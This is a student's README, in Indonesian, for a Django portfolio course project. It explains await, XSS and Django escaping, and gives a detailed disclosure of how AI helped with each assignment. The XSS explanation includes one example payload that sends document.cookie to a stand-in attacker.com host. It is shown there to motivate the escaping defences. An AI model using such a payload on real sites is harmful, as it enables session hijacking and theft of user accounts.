Kalau await tidak dipakai, fetch(url) akan langsung mengembalikan objek Promise yang masih pending, bukan Response yang sudah jadi. Baris berikutnya (response.ok, response.json()) akan dijalankan terhadap Promise itu, bukan terhadap data asli, dan karena Promise tidak punya property .ok atau method .json() yang langsung berguna seperti itu, kodenya akan error (undefined atau TypeError) atau paling tidak berjalan dengan urutan yang salah — fungsi buildProjectCardElement() bisa saja dipanggil sebelum data project benar-benar sampai dari server, karena JavaScript tidak menunggu fetch() selesai dan langsung lanjut ke baris sesudahnya seolah-olah proses itu sudah selesai, padahal belum.

3. XSS (Cross-Site Scripting) adalah serangan di mana penyerang menyisipkan kode (biasanya JavaScript) ke dalam data yang nantinya ditampilkan ke pengguna lain, dan browser korban mengeksekusi kode itu seolah-olah itu bagian sah dari halaman, karena browser tidak bisa membedakan HTML/JavaScript yang memang dimaksudkan developer dengan yang disisipkan penyerang lewat input. Dalam konteks proyekku, kalau seseorang (termasuk Editor yang statusnya "boleh mengubah data") mengisi judul proyek dengan <img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">, lalu teks itu disisipkan mentah-mentah ke HTML, kode itu bisa mencuri cookie session pengguna lain yang membuka halaman Project, atau melakukan aksi apa pun atas nama mereka (termasuk superuser yang sedang login). Data yang ditampilkan lewat AJAX/JavaScript lebih rentan dibanding data yang ditampilkan langsung lewat template Django, karena perbedaan mendasar soal siapa yang melakukan escaping dan kapan. Django Template Language secara default melakukan auto-escaping untuk setiap variabel yang dirender lewat {{ variable }} — karakter seperti <, >, &, " otomatis diubah jadi HTML entity (&lt;, &gt;, dst.) sebelum dikirim ke browser, kecuali developer secara eksplisit mematikannya dengan |safe atau {% autoescape off %}. Jadi kalau project.description berisi <script>, dengan {{ project.description }} di template, yang sampai ke browser sudah berupa teks &lt;script&gt;, bukan tag HTML sungguhan, sehingga browser menampilkannya sebagai teks biasa, bukan menjalankannya. Sebaliknya, saat data diambil lewat fetch() sebagai JSON dan dirakit jadi HTML di JavaScript (seperti buildProjectCardElement() di proyekku), tidak ada mekanisme otomatis semacam itu. Kalau developer menyisipkan nilai dari JSON langsung ke dalam template string lalu memasukkannya ke articleElement.innerHTML = ..., browser akan memparsing string itu sebagai HTML sungguhan — termasuk tag <script> atau atribut onerror di dalamnya — dan mengeksekusinya. Tanggung jawab melakukan escaping sepenuhnya berpindah ke developer; kalau lupa (seperti versi awal buildProjectCardElement() sebelum aku tambahkan escapeHtml()), lubang XSS-nya terbuka begitu saja, dan ini persis yang terjadi di proyekku sebelum diperbaiki — field project.title dan project.description sempat disisipkan mentah ke innerHTML tanpa escaping sama sekali. Karena itulah aku menambahkan fungsi escapeHtml() di sisi klien (mengganti <, >, &, ", ' jadi entity sebelum masuk ke template string) sebagai pertahanan utama, dan strip_tags() di clean_title/clean_description pada ModelForm di sisi server sebagai lapisan pertahanan kedua — supaya data yang tersimpan di database pun sudah bersih dari tag HTML sejak awal, tidak hanya mengandalkan proses render di satu tempat saja.

## AI Disclosure

Aku pakai AI (ChatGPT/Claude) sebagai *pair programmer*, terutama di tahap drafting awal — bukan buat generate satu website jadi sekali klik.

### Tugas 1

**Bagian yang dibantu AI:**
- Ide struktur awal grid untuk hero & about section
- Draft pertama animasi keyframe untuk role text yang bergantian
- Saran nama class dan pendekatan efek "kartu bertumpuk" untuk skill deck
- Penyusunan kalimat di README ini sendiri, poin-poin dan progres di atas aku yang tentuin, tapi AI bantu merapikan cara penyampaiannya biar enak dibaca

**Bagian yang aku kerjain/perbaiki manual:**
- **Timing animasi** - hasil AI untuk `@keyframes cycleText` awalnya overlap antar teks, aku hitung ulang persentase durasinya (fade-in di 3%, hold sampai 30%, fade-out di 33%) supaya transisinya bersih dan nggak numpuk.
- **Scroll-spy tanpa JS** - AI awalnya nyaranin pakai JavaScript `IntersectionObserver`. Aku sengaja ganti ke pendekatan CSS `:target` + `:has()` karena projectnya emang niat dibikin zero-JS, jadi bukan sekadar nerima saran mentah-mentah.
- **Konsistensi visual** - nilai warna, radius, dan shadow yang disaranin AI awalnya nggak konsisten antar section (beda-beda border-radius di card, beda opacity shadow). Aku rapiin jadi CSS variables (`--accent`, `--line`, `--radius`) biar satu sumber kebenaran.
- **Aksesibilitas dasar** - nambahin `alt` text yang deskriptif di tiap `<img>` dan `aria-label` di social icon, yang di draft awal AI kosong/generic.
- **Responsive fix** - breakpoint 700px untuk skill deck itu hasil trial-error manual aku sendiri karena versi awal dari AI patah di ukuran tablet (kartu ke-overlap parah karena `margin-left: -3rem` nggak di-reset).

### Tugas 2

**Bagian yang dibantu AI:**
- Ide struktur field pada model `Skill` (mengikuti pola yang sudah ada di model `Experience`) dan penjelasan alur `urls.py` → `views.py` → `models.py` → `template` untuk menjawab pertanyaan reflektif nomor 1.
- Pendekatan animasi *ticker* role text di home page supaya loop-nya berjalan terus-menerus tanpa jeda/berhenti, dengan konten ticker diduplikasi dan digeser lewat `translateX` secara infinite.
- Penyusunan kalimat di blok `Tugas 2` pada README ini.

**Bagian yang aku kerjain/perbaiki manual:**
- Penyesuaian query dan penamaan context (`skill_list`) di view `show_skill` supaya konsisten dengan pola yang sudah dipakai di `show_experience`.
- Verifikasi bahwa loop ticker benar-benar mulus (tidak ada jeda/patah terlihat) dengan mengecek langsung di browser, bukan cuma percaya asumsi AI soal timing animasi.
- Keputusan struktur data (field apa saja yang perlu ada di model `Skill`) tetap aku yang tentukan sesuai kebutuhan tampilan `skill-card`.

**Keterbatasan AI yang aku sadari selama proses ini:**
AI cenderung ngasih solusi yang "kelihatan benar" tapi nggak selalu tervalidasi cross-browser atau cross-device, misalnya soal dukungan `:has()` dan `mask-image` yang sebenarnya belum universal di semua browser, tapi AI nggak otomatis ngingetin itu kecuali ditanya spesifik. AI juga nggak "melihat" hasil visualnya secara langsung, jadi hal-hal kayak overlap animasi, ticker yang patah saat loop, atau spacing yang kelihatan aneh cuma bisa ketauan setelah aku benar-benar buka di browser dan cek manual. Intinya, AI ini alat bantu percepatan, tapi keputusan desain final dan debugging visual tetap kerjaan manusia.

### Tugas 3

**Bagian yang dibantu AI:**
- Debugging error deployment `NotSupportedError: PostgreSQL 15 or later is required` di server PWS — AI membantu membaca exception trace dan mengidentifikasi bahwa akar masalahnya adalah versi Django yang sudah drop support PostgreSQL 14, lalu menyarankan downgrade versi Django sebagai solusi paling praktis (karena versi database di PWS tidak bisa aku ubah sendiri).
- Struktur awal model `Project`, `ProjectForm`, view CRUD (`show_project`, `create_project`, `delete_project`, `get_project_json`), routing di `urls.py`, dan template (`project.html`, `project_form.html`, `project_delete_modal.html`) — semuanya dibuat AI dengan cara mereplikasi pola yang sudah ada persis di section Experience (jadi bukan generate dari nol/asal-asalan), termasuk CSS section Project yang meniru struktur `.experience-*` yang sudah ada.
- Implementasi fitur edit untuk Experience & Project — pendekatan reuse form yang sama untuk mode "tambah" dan "edit" (dibedakan lewat parameter `instance` di view, serta pengecekan `{% if experience %}`/`{% if project %}` di template untuk mengubah judul, action form, dan teks tombol) adalah saran dari AI.
- Penyusunan kalimat pada blok `Tugas 3` di README ini.

**Bagian yang aku kerjain/perbaiki manual:**
- Penentuan field apa saja yang relevan untuk model `Project` (misalnya menambahkan `project_url` yang tidak ada di `Experience`, dan mengganti `started_at`/`ended_at` jadi cukup `created_at` karena project tidak punya konsep "sedang berlangsung") tetap aku yang putuskan sesuai kebutuhan tampilan.
- Menemukan sendiri bug navbar "PROJECT" yang cuma muncul di sebagian halaman — AI baru menyadari penyebabnya (bahwa `index.html` dan `skill.html` tidak meng-extend `base.html`) setelah aku laporkan gejalanya lewat screenshot, jadi proses debugging tetap butuh aku yang mengamati hasil visual di browser dan melaporkan gejala secara spesifik.
- Verifikasi bahwa CSS section Project benar-benar ter-load dengan benar (bukan cuma percaya style sudah "pasti kepasang" dari AI) — aku cek langsung lewat DevTools dan screenshot browser saat tampilannya masih berantakan/terlalu ke atas.
- Testing manual di localhost untuk memastikan fitur create, edit, dan delete Project & Experience benar-benar berfungsi (data tersimpan, form ke-prefill saat edit, konfirmasi delete muncul) sebelum redeploy ke PWS.

**Keterbatasan AI yang aku sadari selama proses ini:**
AI tidak bisa "melihat" hasil render halaman secara langsung, jadi ketika ada masalah visual (seperti section Project yang tampilannya terlalu ke atas dan berantakan karena CSS belum ke-apply, atau navbar yang tidak konsisten antar halaman), AI hanya bisa menebak penyebabnya berdasarkan deskripsi/screenshot yang aku kirim — kalau screenshot atau deskripsinya kurang detail, diagnosis awal AI bisa saja meleset dan butuh iterasi tambahan. AI juga cenderung berasumsi bahwa semua halaman di proyek punya struktur yang seragam (semua extend `base.html`), padahal kenyataannya `index.html` dan `skill.html` dibuat standalone di tugas-tugas sebelumnya — AI baru bisa memberi solusi yang tepat setelah aku share isi file yang sebenarnya, bukan cuma berdasarkan asumsi pola umum Django project. Ini menegaskan bahwa AI paling efektif dipakai sebagai *pair programmer* yang mereplikasi pola dari kode nyata yang sudah ada, bukan sebagai alat yang bisa menebak struktur proyek tanpa diberi konteks lengkap.

### Tugas 4

**Bagian yang dibantu AI:**
- Merancang model otorisasi dengan `Group` + `Permission` bawaan Django (bukan pengecekan `is_superuser` di banyak tempat), sehingga peran Editor cukup diberi permission `change_*` dan superuser otomatis mendapat semuanya, lengkap dengan tabel hak akses untuk 4 peran.
- Kode dekorator `@login_required` + `@permission_required(..., raise_exception=True)` + `@require_POST` di view, serta pola `{% if perms.main.change_project %}` di template untuk menyembunyikan tombol bagi pengguna yang tidak berhak.
- Penerapan fitur star: field `starred_by` di model `Project`, komponen `project_star.html`, view `toggle_star`, dan CSS tombol star yang disesuaikan dengan palet warna situsku (termasuk memperbaiki warna `.star-count` yang hampir tidak terlihat di tombol berlatar terang dan spesifisitas CSS yang bikin margin tombol Edit tertimpa).
- Diagnosis error berdasarkan traceback dan screenshot: `PRODUCTION=True` yang memicu koneksi PostgreSQL di laptop, `ROOT_URLCONF` yang hilang, dan `NoReverseMatch` karena beda nama URL.
- Panduan Git (branch per fitur, conventional commits, `merge --no-ff`, menyamakan `master` dan `main`) serta penyusunan kalimat pada blok `Tugas 4` di README ini.

**Bagian yang aku kerjain/perbaiki manual:**
- Memutuskan menerapkan otorisasi di kedua section (Project dan Experience), padahal tutorial hanya mencontohkan Project, setelah melihat sendiri halaman Experience-ku masih terbuka untuk semua pengunjung.
- Membuat grup `Editor` di Django Admin, memilih hanya permission `change` (tanpa `add` dan `delete`), membuat akun uji `keluarga.barak`, dan menguji tiap peran langsung di browser. Dari situ aku menemukan gejala bug Editor: tombol Edit muncul tapi berujung 403, sesuatu yang tidak akan ketahuan kalau aku cuma login sebagai superuser.
- Menyesuaikan semua kode dengan nama yang sebenarnya ada di proyekku (`show_project`, `project_id`, `experience_id`), karena contoh dari tutorial dan AI memakai nama yang berbeda.
- Memeriksa `/api/project/` untuk memastikan `starred_by` hanya berisi username, dan mengganti nilai `name` `"Burhan"` dari kode tutorial menjadi namaku.
- Menjalankan sendiri semua perintah Git di laptopku, mengecek `git status` dan `git log`, dan memastikan `.env` serta `db.sqlite3` tidak ikut ter-commit.

**Keterbatasan AI yang aku sadari selama proses ini:**
AI tidak bisa melihat file dan struktur proyekku, jadi beberapa kali ia menebak nama yang ternyata salah: menyuruh tes ke `/projects/add/` padahal path sebenarnya `/project/add/`, memakai nama URL `show_projects` dari tutorial padahal punyaku `show_project`, dan memakai parameter `id` di contoh awal padahal di `urls.py`-ku `project_id`. Semuanya baru benar setelah aku mengirim halaman 404 yang menampilkan daftar URL asli dan isi `views.py`. AI juga sempat salah arah saat mendiagnosis "A server error occurred": tebakan pertamanya `DEBUG=False`, yang cuma menjelaskan kenapa pesannya generik, sementara akar masalahnya (`PRODUCTION=True` yang bikin Django mencoba PostgreSQL) baru ketemu setelah aku menempelkan traceback dari terminal. Bug Editor yang kena 403 juga tidak bisa ditebak AI karena sisa pengecekan `is_superuser` ada di kode lamaku yang belum ia lihat. Selain itu AI tidak bisa menjalankan apa pun di komputerku dan tidak melihat hasil render: `git push` yang terlihat "sukses" ternyata cuma `Everything up-to-date` karena commit ada di branch `master`, dan jarak antar tombol di card Project baru ketahuan berantakan setelah aku melihatnya di browser. Ini menegaskan bahwa AI berguna untuk merancang pola dan mempercepat debugging, tapi setiap sarannya tetap harus dicocokkan dengan kode nyata dan diverifikasi manual di mesin dan browser sendiri.

### Tugas 5

Tools dan strategi prompting: Untuk tugas ini aku lanjut memakai Claude (claude.ai) dalam percakapan yang sama dengan Tugas 4, mengikuti urutan 5 langkah tutorial (toast, template AJAX, script AJAX, modal tambah proyek, pengujian). Strateginya sama seperti tugas sebelumnya: tiap langkah tutorial kukirim sebagai screenshot, lalu aku minta AI menyesuaikannya dengan kode nyataku (bukan menyalin mentah-mentah dari tutorial), dan setiap kali muncul error aku menempelkan traceback lengkap dari terminal, bukan sekadar menyebut gejalanya. Karena perubahan di tugas ini saling bergantung (mengubah views.py memengaruhi urls.py, mengubah urls.py memengaruhi script di template), aku membiasakan mengirim beberapa file sekaligus (views.py + urls.py + forms.py) begitu errornya mulai berantai, supaya AI bisa mencocokkan semuanya sekali jalan alih-alih tambal sulam satu ImportError per giliran.

Bagian yang dibantu AI:

Konstruksi komponen toast (toast.html, CSS-nya) dan modal tambah proyek (project_form_modal.html, CSS-nya) sesuai tutorial, dengan penyesuaian variabel CSS (var(--paper) → 
#242625) karena tutorial mengasumsikan variabel yang tidak ada di :root proyekku.
Rancangan script AJAX penuh untuk project.html dan experience.html: fungsi displayPageSection(), buildProjectCardElement()/buildExperienceCardElement(), fetchProjects()/fetchExperiences(), debouncing pencarian, dan fungsi addProject()/addExperience() yang mengirim FormData lewat fetch() dengan header X-CSRFToken dari cookie.
Rancangan view create_project_ajax/create_experience_ajax yang membalas JsonResponse dengan status code sesuai kondisi (200/400/403), beserta alasan kenapa @login_required tidak dipakai di view itu (karena akan redirect, bukan membalas JSON).
Diagnosis ImportError berantai (show_project, lalu get_project_json) dengan membandingkan daftar import di urls.py terhadap fungsi yang benar-benar ada di views.py.
Penambahan fungsi escapeHtml() di JavaScript dan clean_title/clean_description dengan strip_tags() di kedua ModelForm, sebagai dua lapis proteksi XSS (klien dan server).
Penjelasan konsep untuk tiga pertanyaan reflektif (debouncing, await, XSS) dan penyusunan kalimat di blok Tugas 5 README ini.

Bagian yang aku kerjain/perbaiki manual:

Menjalankan python manage.py runserver berulang kali dan menyalin traceback lengkapnya ke chat, karena AI tidak bisa menjalankan kode di komputerku sendiri.
Menemukan sendiri bahwa field star (project.starred_by vs star_count/is_starred/starred_by_names) tidak sinkron antara script JavaScript dan views.py yang sebenarnya — ini baru ketahuan setelah aku kirim isi views.py yang sesungguhnya, bukan dari asumsi awal.
Memverifikasi manual bahwa class .hide benar-benar ada di style.css, karena seluruh mekanisme tampil/sembunyi state (loading, error, empty, grid) bergantung sepenuhnya pada satu class ini — kalau terlewat, bug-nya tidak kelihatan dari kode, cuma kelihatan di browser.
Melakukan uji coba XSS secara langsung dengan memasukkan payload <script>/onerror ke form judul proyek, untuk memastikan proteksi yang diberikan AI benar-benar mencegah eksekusi, bukan cuma "terlihat aman" di kode.
Menguji keempat peran (pengunjung, pengguna biasa, Editor, superuser) satu per satu di browser pada fitur AJAX yang baru, memastikan hak akses dari Tugas 4 tetap konsisten setelah seluruh alur render dan submit data dipindah ke AJAX.
Memutuskan menerapkan pola AJAX yang sama ke Experience sekaligus (bukan cuma Project yang dicontohkan tutorial), supaya kedua section yang sudah punya sistem peran dari Tugas 4 tetap konsisten caranya menampilkan dan menambah data.

Keterbatasan AI yang aku sadari selama proses ini: Keterbatasan paling jelas di tugas ini adalah AI tidak tahu isi views.py/urls.py terbaru kalau tidak dikirim ulang, padahal keduanya terus berubah sepanjang pengerjaan. Ini menyebabkan rangkaian ImportError yang baru terpecahkan setelah aku kirim seluruh isi filenya, bukan cuma potongan kode. AI juga sempat memberi script JavaScript yang membaca struktur data star dari pola Tugas 4 (use_natural_foreign_keys), padahal views.py-ku yang sebenarnya sudah berubah jadi JsonResponse manual dengan field berbeda — kesalahan semacam ini baru bisa diperbaiki AI setelah aku membandingkan dan menunjukkan isi file yang sebenarnya, bukan dari hasil tebakan "pola Django pada umumnya". Pelajaran yang sama berulang dari tugas-tugas sebelumnya: kode yang dihasilkan AI untuk proyek yang sudah berkembang jauh dari contoh tutorial harus selalu dicocokkan ulang dengan file asli sebelum dipakai, terutama saat beberapa file saling bergantung satu sama lain (view, url, template, JavaScript) dan perubahan di satu tempat bisa mematahkan tempat lain tanpa pesan error yang langsung menunjuk ke akar masalahnya. Selain itu, soal keamanan (XSS, CSRF, permission) AI bisa menjelaskan konsepnya dengan baik dan memberi kode yang secara desain benar, tapi aku tetap merasa perlu membuktikannya sendiri dengan mencoba payload serangan sungguhan di browser, bukan hanya percaya bahwa kode itu "pasti aman" karena ditulis mengikuti praktik yang benar.

---

© 2026 Bagas Mahendra Sri Kasta - Fakultas Ilmu Komputer, Universitas Indonesia